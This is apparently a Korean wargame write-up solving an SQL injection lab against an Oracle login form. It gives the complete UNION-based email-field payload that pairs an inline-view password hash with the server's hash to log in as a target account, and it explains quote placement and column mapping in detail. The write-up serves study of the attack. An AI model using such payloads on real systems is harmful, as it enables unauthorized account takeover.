# Oracle SQL Injection 2번 — UNION과 해시 일치로 로그인 우회

![우당탕탕 워게임 공부 기록](../oracle-sql-injection.png){ .post-thumbnail }

## 요약

SQL Injection 실습 정리 노트의 **문제 2**를 옮긴 기록이다. 1번에서는 OR로 조건을 연결했다면, 이번에는 **UNION으로 조회 결과에 직접 구성한 행을 더하는 방식**으로 접근했다.

| 항목 | 내용 |
| --- | --- |
| 문제 | 문제 2. 로그인 우회 |
| 대상 계정 | `z_answer@eqst3.com` |
| 풀이 상태 | 해결 — 원본 노트에 기록된 상태 |
| 조건 | AND·OR 필터링 / 대소문자 변형·이중 삽입 차단 / 주석 사용 안 함 |
| DB | Oracle — 버전은 원본에 미기재 |
| 입력 지점 | 이메일 입력칸이 연결되는 LOGIN_ID |
| 핵심 개념 | UNION, 15개 컬럼 대응, 인라인 뷰, 비밀번호 해시 일치 |
| 쿼리 근거 | 원본에서 로그인 실패 응답의 xmlquery로 확인했다고 기록 |

!!! note "기록의 범위"

    원본 노트의 쿼리·페이로드·성공 기록을 정리한 글이다. 이 글을 작성하면서 실습 서버에 요청을 보내거나 로그인 동작을 다시 검증하지는 않았다. 해시 문자열은 원본 그대로 사용하며, 해시 알고리즘은 추정하지 않는다.

## 입력값과 고정값 구분

색은 SQL 문법이 아니라 **문자의 출처**를 나타낸다. 쿼리 블록은 굵은 글씨와 두 가지 색으로 구분한다.

| 구분 | 의미 |
| --- | --- |
| <span class="sql-fixed">초록색 · 개발자 틀</span> | 미리 작성된 쿼리, 입력칸 앞뒤의 작은따옴표, 원래의 AND 조건 |
| <span class="sql-input">파란색 · 직접 입력</span> | 이메일 칸에 넣은 모든 문자와 비밀번호 입력값 |
| <span class="sql-input">파란색 · 입력에서 파생된 값</span> | 서버가 입력 비밀번호를 처리해 만든 해시. 직접 타이핑한 SQL과는 구별해 설명 |

원본 노트에서는 서버가 붙인 마지막 비밀번호 비교 부분 전체를 초록색으로 묶었다. 이 글에서는 **쿼리 틀은 초록색, 입력에 따라 달라지는 해시 문자열은 파란색**으로 세분화한다. 서버가 만든 해시를 파란색으로 표시한다고 해서 비밀번호 칸에서 SQL 문법을 직접 주입할 수 있다는 뜻은 아니다.

## 쿼리 구조 — 원본 응답에서 확인

원본에는 다음 15개 컬럼의 SELECT가 기록되어 있다. 아래 `이메일 입력값`과 `서버가 만든 해시`는 위치를 설명하는 자리표시자다.

<div class="highlight sql-origin"><pre><code><span class="sql-fixed">SELECT ACCT_ID, LOGIN_ID, USER_NM, USER_TERMS_YN, PRIVACY_YN, EMAIL, PASS,
       ZIPCODE, ADDRESS1, ADDRESS2, MAIL_CERTI_KEY, CERTI_YN, ADMIN_YN,
       PWDCNT, FSTPWD
FROM SKINFOSEC.MEMBER
WHERE LOGIN_ID = '</span><span class="sql-input">이메일 입력값</span><span class="sql-fixed">' AND PASS = '</span><span class="sql-input">서버가 만든 해시</span><span class="sql-fixed">'</span></code></pre></div>

### 막힌 지점

- AND·OR 문자열은 대소문자를 바꾸거나 이중 삽입해도 차단됐다. 원본의 예시는 `oorr`다.
- 비밀번호는 입력한 문자열 그대로가 아니라 **서버에서 해시 처리한 값**으로 쿼리에 들어갔다.
- 따라서 1번의 OR 방식이나 비밀번호 칸의 직접 SQL 조작 대신, 이메일 칸을 활용하는 접근이 필요했다.

### 단서가 된 응답

원본에서는 **Burp Suite로 로그인 요청과 응답을 확인**했다. 실패 응답 JSON의 `xmlquery`에 실제 쿼리가 노출되어 테이블명, 컬럼 순서, 비밀번호 처리 결과를 알 수 있었다고 기록했다.

| 확인한 항목 | 원본 기록 |
| --- | --- |
| 테이블 | SKINFOSEC.MEMBER |
| 로그인 식별 컬럼 | LOGIN_ID |
| 비밀번호 컬럼 | PASS |
| 반환 컬럼 수 | 15개 |
| 입력 비밀번호 | <code><span class="sql-input">1234</span></code> |
| 응답에서 확인한 해시 | <code><span class="sql-input">ddb4e95951c545d349e875dfcb04f8eb</span></code> |

## 사고 흐름

1. AND·OR로 조건을 바꾸는 대신 **UNION으로 결과 행을 구성**하기로 했다.
2. 첫 SELECT는 원본에서 존재하지 않는 값으로 사용한 `x`를 LOGIN_ID에 넣어 결과가 없도록 했다.
3. 두 번째 SELECT에는 원래 쿼리와 같은 **15개 컬럼**을 만들고, LOGIN_ID와 EMAIL 위치에 대상 이메일을 배치했다.
4. 인라인 뷰에서 원본에 기록된 해시를 **PASS라는 이름의 컬럼**으로 만들었다.
5. 입력 끝을 작은따옴표가 열린 상태로 두어, 서버가 붙이는 따옴표와 `AND PASS = ...` 조건이 두 번째 SELECT의 WHERE절에 자연스럽게 이어지도록 했다.
6. 직접 만든 PASS 값과 서버가 생성한 해시가 같으므로 두 번째 SELECT가 한 행을 반환한다. 원본에는 그 행의 LOGIN_ID로 로그인 처리됐다고 기록되어 있다.

!!! tip "AND를 입력하지 않아도 AND 조건을 이용할 수 있다"

    이번 페이로드에는 AND를 직접 넣지 않는다. **개발자가 작성해 둔 뒤쪽 AND 조건이 남아 있고**, 그 조건이 참이 되도록 인라인 뷰의 PASS 값을 맞춘다. 주석으로 뒤쪽 쿼리를 지우지 않는 이유도 여기에 있다.

## 적용 페이로드

### 이메일 입력칸 — 전체가 직접 입력

다음은 원본의 페이로드다. **마지막 a 뒤에 작은따옴표를 추가하지 않는다.** 실제 입력 문자열에는 줄바꿈을 추가하지 않았다.

<div class="highlight sql-origin"><pre><code><span class="sql-input">x' UNION SELECT NULL,'z_answer@eqst3.com',NULL,NULL,NULL,'z_answer@eqst3.com',PASS,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM (SELECT 'ddb4e95951c545d349e875dfcb04f8eb' AS PASS FROM DUAL) WHERE 'a'='a</span></code></pre></div>

### 비밀번호 입력칸 — 해시 생성용

<div class="highlight sql-origin"><pre><code><span class="sql-input">1234</span></code></pre></div>

여기서 비밀번호는 임의의 아무 값으로 바꾸면 안 된다. **인라인 뷰에 적은 해시와 서버가 만든 해시가 같아야 하므로**, 원본에서 해당 해시를 확인한 입력값을 함께 사용한다.

## 완성되는 쿼리

아래는 원본의 SELECT 구조에 페이로드와 서버 처리 값을 합친 형태다. 읽기 좋게 줄을 나눴으며, 컬럼을 생략하는 `...`는 넣지 않았다.

<div class="highlight sql-origin"><pre><code><span class="sql-fixed">SELECT ACCT_ID, LOGIN_ID, USER_NM, USER_TERMS_YN, PRIVACY_YN, EMAIL, PASS,
       ZIPCODE, ADDRESS1, ADDRESS2, MAIL_CERTI_KEY, CERTI_YN, ADMIN_YN,
       PWDCNT, FSTPWD
FROM SKINFOSEC.MEMBER
WHERE LOGIN_ID = '</span><span class="sql-input">x'
UNION
SELECT NULL,'z_answer@eqst3.com',NULL,NULL,NULL,'z_answer@eqst3.com',PASS,
       NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
FROM (SELECT 'ddb4e95951c545d349e875dfcb04f8eb' AS PASS FROM DUAL)
WHERE 'a'='a</span><span class="sql-fixed">' AND PASS = '</span><span class="sql-input">ddb4e95951c545d349e875dfcb04f8eb</span><span class="sql-fixed">'</span></code></pre></div>

### 작은따옴표 14개의 출처

완성된 쿼리의 작은따옴표는 **총 14개**다. 글자색과 함께 왼쪽부터 순서를 확인하면, 직접 넣은 따옴표와 서버가 붙인 따옴표를 구분할 수 있다.

| 순서 | 위치와 역할 | 출처 |
| --- | --- | --- |
| 1 | LOGIN_ID 값 시작 | <span class="sql-fixed">개발자 틀</span> |
| 2 | x 뒤에서 원래 문자열 닫기 | <span class="sql-input">내 입력</span> |
| 3·4 | 두 번째 컬럼의 대상 이메일 양옆 | <span class="sql-input">내 입력</span> |
| 5·6 | 여섯 번째 컬럼의 대상 이메일 양옆 | <span class="sql-input">내 입력</span> |
| 7·8 | 인라인 뷰의 해시 양옆 | <span class="sql-input">내 입력</span> |
| 9·10 | WHERE 비교식 첫 번째 a 양옆 | <span class="sql-input">내 입력</span> |
| 11 | 두 번째 a 앞 | <span class="sql-input">내 입력</span> |
| 12 | 두 번째 a 뒤: 원래 이메일 뒤에 붙던 따옴표 | <span class="sql-fixed">개발자 틀</span> |
| 13·14 | 서버가 만든 비밀번호 해시 양옆 | <span class="sql-fixed">개발자 틀</span> |

!!! info "같은 해시 문자열도 들어온 경로가 다르다"

    인라인 뷰의 해시와 그 양옆 따옴표는 **이메일 칸에 직접 입력**했다. 마지막 비교식의 해시는 **서버가 비밀번호 입력에서 생성**했고, 그 양옆 따옴표는 **개발자 틀**이다. 값이 같아도 출처는 다르다.

### 15개 컬럼 대응

UNION의 컬럼은 이름이 아니라 **SELECT 목록의 순서**로 대응한다. 원본의 반환 순서에 맞춰 다음처럼 배치했다.

| 순서 | 원래 컬럼 | 두 번째 SELECT의 값 |
| --- | --- | --- |
| 1 | ACCT_ID | NULL |
| 2 | LOGIN_ID | 대상 이메일 |
| 3 | USER_NM | NULL |
| 4 | USER_TERMS_YN | NULL |
| 5 | PRIVACY_YN | NULL |
| 6 | EMAIL | 대상 이메일 |
| 7 | PASS | 인라인 뷰의 PASS |
| 8 | ZIPCODE | NULL |
| 9 | ADDRESS1 | NULL |
| 10 | ADDRESS2 | NULL |
| 11 | MAIL_CERTI_KEY | NULL |
| 12 | CERTI_YN | NULL |
| 13 | ADMIN_YN | NULL |
| 14 | PWDCNT | NULL |
| 15 | FSTPWD | NULL |

## 핵심 개념

### 인라인 뷰와 PASS

이 부분은 이메일 입력에 포함된 서브쿼리다.

<div class="highlight sql-origin"><pre><code><span class="sql-input">(SELECT 'ddb4e95951c545d349e875dfcb04f8eb' AS PASS FROM DUAL)</span></code></pre></div>

괄호 안 SELECT가 **PASS 컬럼 하나와 행 하나를 가진 결과**를 만든다. 바깥 SELECT는 이를 FROM의 데이터 소스로 사용한다. 실제 테이블을 생성하거나 회원 데이터를 INSERT하는 작업은 아니다.

이 때문에 뒤쪽의 PASS는 원래 회원 테이블의 비밀번호가 아니라, **두 번째 SELECT가 읽는 인라인 뷰의 PASS**를 가리킨다.

### 남아 있는 WHERE 조건

<div class="highlight sql-origin"><pre><code><span class="sql-input">WHERE 'a'='a</span><span class="sql-fixed">' AND PASS = '</span><span class="sql-input">ddb4e95951c545d349e875dfcb04f8eb</span><span class="sql-fixed">'</span></code></pre></div>

| 평가 단계 | 이 풀이의 전제에서 나온 결과 |
| --- | --- |
| a와 a의 문자열 비교 | 참 |
| 인라인 뷰 PASS와 서버 생성 해시 비교 | 두 값이 같으므로 참 |
| 두 번째 SELECT의 WHERE | 참 AND 참 → 참 |
| 첫 번째 SELECT | x에 해당하는 행이 없다는 전제에서 0행 |
| 두 번째 SELECT | 직접 구성한 1행 |
| UNION 결과 | 위 전제에서 1행 |

## 주의점 / 막혔던 부분

!!! warning "컬럼 개수만 맞추면 끝나는 것은 아니다"

    Oracle UNION은 두 SELECT 목록의 **컬럼 수가 같고, 대응하는 표현식이 같은 데이터 타입 그룹**이어야 한다. 이 기록에서는 원본의 15개 배치를 유지했다. 다른 쿼리에 그대로 적용되는 범용 배치는 아니다.

!!! info "NULL은 빈 문자열이라는 뜻이 아니다"

    NULL은 값이 없거나 알 수 없음을 나타낸다. 여기서는 필요한 컬럼 수를 맞추는 데 사용했다. 화면에서 빈칸처럼 표시되더라도 문자열 자체가 들어 있는 것과는 구별해야 한다.

!!! note "DUAL에 대한 원본 설명 보완"

    DUAL은 상수나 표현식을 한 번 조회할 때 사용할 수 있는 Oracle의 1행 테이블이다. 원본의 “Oracle에서는 FROM을 생략할 수 없다”는 설명은 모든 버전에 적용되지는 않는다. **Oracle Database Release 23부터는 상수 표현식을 조회할 때 FROM DUAL을 생략할 수 있다.** 이 글은 실습 버전을 알 수 없으므로 원본의 FROM DUAL을 그대로 유지했다.

!!! warning "가짜 결과 행과 실제 회원 데이터는 다르다"

    UNION은 이 SELECT의 결과를 합칠 뿐, 대상 계정의 실제 비밀번호를 바꾸지 않는다. 또한 결과에 이메일을 넣는 것만으로 모든 서비스에서 로그인이 성립하는 것은 아니다. 이 실습에서는 반환 행을 로그인 처리에 사용하는 동작이 있었다고 원본에 기록되어 있다.

## 정리

이번 문제에서는 **뒤쪽 비밀번호 조건을 없애는 대신, 그 조건에 맞는 PASS를 가진 결과 행을 구성**했다. 필터에 막힌 문자를 반복해서 바꾸기보다, 응답에 드러난 쿼리 구조와 입력값의 처리 과정을 읽는 것이 전환점이었다.

작은따옴표를 어디서 닫는지, UNION의 컬럼이 어떤 순서로 대응하는지, 마지막 PASS가 어느 데이터 소스를 가리키는지를 함께 보면 풀이가 연결된다.
